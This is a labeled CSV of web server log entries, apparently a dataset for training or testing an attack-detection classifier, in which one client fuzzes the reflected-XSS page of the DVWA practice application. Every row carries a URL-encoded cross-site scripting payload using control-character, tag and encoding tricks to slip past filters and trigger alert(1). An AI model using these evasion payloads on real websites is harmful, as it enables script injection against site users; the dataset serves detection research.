ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.11,-,-,2024-07-01 15:56:30-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx0Acript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx0Acript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:56:35-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx08cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1740,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx08cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:56:39-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx02cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1740,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx02cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:56:44-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx03cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1740,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx03cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:56:48-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx04cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1741,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx04cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:56:53-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx01cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx01cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:56:58-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx05cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1741,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx05cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:02-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx0Bcript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx0Bcript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:07-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx09cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1740,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx09cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:11-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx06cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1741,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx06cript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:16-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx0Ccript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javas%5cx0Ccript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:21-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3e%2f%2a%20%2a%5cx2A%2fjavascript%3aalert(1)%2f%2f%20%2a%2f%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1728,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3e%2f%2a%20%2a%5cx2A%2fjavascript%3aalert(1)%2f%2f%20%2a%2f%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,175,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:25-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3e%2f%2a%20%2a%5cx00%2fjavascript%3aalert(1)%2f%2f%20%2a%2f%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1729,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3e%2f%2a%20%2a%5cx00%2fjavascript%3aalert(1)%2f%2f%20%2a%2f%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,175,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:30-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%3c%2fstyle%5cx3E%3cimg%20src%3d%22about%3ablank%22%20onerror%3djavascript%3aalert(1)%2f%2f%3e%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%3c%2fstyle%5cx3E%3cimg%20src%3d%22about%3ablank%22%20onerror%3djavascript%3aalert(1)%2f%2f%3e%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,210,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:35-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%3c%2fstyle%5cx0D%3cimg%20src%3d%22about%3ablank%22%20onerror%3djavascript%3aalert(1)%2f%2f%3e%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%3c%2fstyle%5cx0D%3cimg%20src%3d%22about%3ablank%22%20onerror%3djavascript%3aalert(1)%2f%2f%3e%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,210,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:40-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%3c%2fstyle%5cx09%3cimg%20src%3d%22about%3ablank%22%20onerror%3djavascript%3aalert(1)%2f%2f%3e%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%3c%2fstyle%5cx09%3cimg%20src%3d%22about%3ablank%22%20onerror%3djavascript%3aalert(1)%2f%2f%3e%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,210,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:44-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%3c%2fstyle%5cx20%3cimg%20src%3d%22about%3ablank%22%20onerror%3djavascript%3aalert(1)%2f%2f%3e%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%3c%2fstyle%5cx20%3cimg%20src%3d%22about%3ablank%22%20onerror%3djavascript%3aalert(1)%2f%2f%3e%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,210,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:49-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%3c%2fstyle%5cx0A%3cimg%20src%3d%22about%3ablank%22%20onerror%3djavascript%3aalert(1)%2f%2f%3e%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cstyle%3e%3c%2fstyle%5cx0A%3cimg%20src%3d%22about%3ablank%22%20onerror%3djavascript%3aalert(1)%2f%2f%3e%3c%2fstyle%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,210,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:54-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22'%60%3eABC%3cdiv%20style%3d%22font-family%3a'foo'%5cx7Dx%3aexpression(javascript%3aalert(1)%3b%2f%2a'%3b%22%3eDEF%20&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1760,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22'%60%3eABC%3cdiv%20style%3d%22font-family%3a'foo'%5cx7Dx%3aexpression(javascript%3aalert(1)%3b%2f%2a'%3b%22%3eDEF%20&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,210,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:57:59-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22'%60%3eABC%3cdiv%20style%3d%22font-family%3a'foo'%5cx3Bx%3aexpression(javascript%3aalert(1)%3b%2f%2a'%3b%22%3eDEF%20&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1760,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22'%60%3eABC%3cdiv%20style%3d%22font-family%3a'foo'%5cx3Bx%3aexpression(javascript%3aalert(1)%3b%2f%2a'%3b%22%3eDEF%20&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,210,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:03-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3eif(%22x%5c%5cxE1%5cx96%5cx89%22%2elength%3d%3d2)%20%7b%20javascript%3aalert(1)%3b%7d%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1752,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3eif(%22x%5c%5cxE1%5cx96%5cx89%22%2elength%3d%3d2)%20%7b%20javascript%3aalert(1)%3b%7d%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,202,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:08-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3eif(%22x%5c%5cxE0%5cxB9%5cx92%22%2elength%3d%3d2)%20%7b%20javascript%3aalert(1)%3b%7d%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1752,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3eif(%22x%5c%5cxE0%5cxB9%5cx92%22%2elength%3d%3d2)%20%7b%20javascript%3aalert(1)%3b%7d%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,202,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:13-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3eif(%22x%5c%5cxEE%5cxA9%5cx93%22%2elength%3d%3d2)%20%7b%20javascript%3aalert(1)%3b%7d%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1752,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3eif(%22x%5c%5cxEE%5cxA9%5cx93%22%2elength%3d%3d2)%20%7b%20javascript%3aalert(1)%3b%7d%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,202,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:18-04:00,GET /DVWA/vulnerabilities/xss_r/?name='%60%22%3e%3c%5cx3Cscript%3ejavascript%3aalert(1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1725,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name='%60%22%3e%3c%5cx3Cscript%3ejavascript%3aalert(1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,155,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:23-04:00,GET /DVWA/vulnerabilities/xss_r/?name='%60%22%3e%3c%5cx00script%3ejavascript%3aalert(1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name='%60%22%3e%3c%5cx00script%3ejavascript%3aalert(1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,155,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:28-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22'%60%3e%3c%5cx3Cimg%20src%3dxxx%3ax%20onerror%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1733,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22'%60%3e%3c%5cx3Cimg%20src%3dxxx%3ax%20onerror%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,166,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:33-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22'%60%3e%3c%5cx00img%20src%3dxxx%3ax%20onerror%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1732,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22'%60%3e%3c%5cx00img%20src%3dxxx%3ax%20onerror%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,166,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:37-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3atext%2fplain%5cx2Cjavascript%3aalert(1)%22%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1728,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3atext%2fplain%5cx2Cjavascript%3aalert(1)%22%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,179,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:42-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3a%5cxD4%5cx8F,javascript%3aalert(1)%22%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1729,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3a%5cxD4%5cx8F,javascript%3aalert(1)%22%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,174,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:47-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3a%5cxE0%5cxA4%5cx98,javascript%3aalert(1)%22%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1734,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3a%5cxE0%5cxA4%5cx98,javascript%3aalert(1)%22%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,180,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:52-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3a%5cxCB%5cx8F,javascript%3aalert(1)%22%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1728,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3a%5cxCB%5cx8F,javascript%3aalert(1)%22%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,174,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:58:57-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx20type%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1725,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx20type%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,178,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:59:02-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx3Etype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1725,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx3Etype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,178,5,116,XSS
